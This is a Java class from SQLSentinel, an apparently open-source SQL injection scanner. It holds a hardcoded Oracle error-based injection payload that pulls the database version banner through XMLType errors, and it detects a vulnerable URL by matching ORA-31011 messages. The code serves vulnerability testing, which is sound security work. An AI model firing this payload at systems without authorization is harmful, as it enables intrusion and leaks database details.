package sqlsentinel.sqlchecker;

/*

 SQLSentinel v 0.4

 Copyright (C) 2012-2013  Luca Magistrelli <blackstorm010[at]gmail[dot]com>

 This program is free software; you can redistribute it and/or
 modify it under the terms of the GNU General Public License
 as published by the Free Software Foundation; either version 2
 of the License, or (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program; if not, write to the Free Software
 Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

 */

import java.util.logging.Level;
import java.util.logging.Logger;


public class SQLOracleXMLErrorFinder implements SQLCommonCheck {
    private final String ErrorBasedCodeInj = "+select+upper+(XMLType(chr(60)||chr(58)||chr(58)||(select+replace(banner,chr(32),chr(58))+from+sys.v_$version+where+rownum=1)||chr(62)))+from+dual)--+";
    private final String[] errorCode = {
        "Error occurred in XML processing",
        "ORA-31011: XML parsing failed",
        "ORA-31011: XML"
    };
    private String url_vuln = null;
    private String url_errorBased_inj = null;
    private ErrorBasedTest errorBT = null;

    public SQLOracleXMLErrorFinder(String url_vuln) {
        this.url_vuln = url_vuln;
    }

    /*
     * test vuln method
     */
    @Override
    public boolean checkVuln() {
        try
        {
            errorBT = new ErrorBasedTest(url_vuln, ErrorBasedCodeInj, errorCode);
            if(errorBT.checkErrorBasedInj()){
                this.url_errorBased_inj = errorBT.getErrorBasedSqlInj();
                return true;
            }
            return false;
        } catch (Exception ex) {
                Logger.getLogger(SQLOracleXMLErrorFinder.class.getName()).log(Level.SEVERE, null, ex);
                return false;
        }   
    }
    
    /*
     * return the url complete with sql injection
     */
    @Override
    public String getSQLInjUrl(){
        return this.url_errorBased_inj;
    }
}
